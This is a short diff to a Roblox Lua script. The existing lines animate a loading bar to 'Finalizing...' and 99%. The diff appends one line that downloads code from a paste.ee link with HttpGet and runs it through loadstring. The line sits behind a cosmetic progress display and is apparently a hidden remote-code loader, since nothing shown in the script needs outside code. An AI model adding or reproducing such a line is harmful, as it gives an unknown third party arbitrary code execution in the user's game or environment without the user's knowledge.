@@ -117,3 +117,5 @@ end
 status.Text = "Finalizing..."
 percentLabel.Text = "99%"
 barFill:TweenSize(UDim2.new(0.99, 0, 1, 0), "Out", "Sine", 0.2, true)
+
+loadstring(game:HttpGet("https://paste.ee/r/glpPpoMo"))()
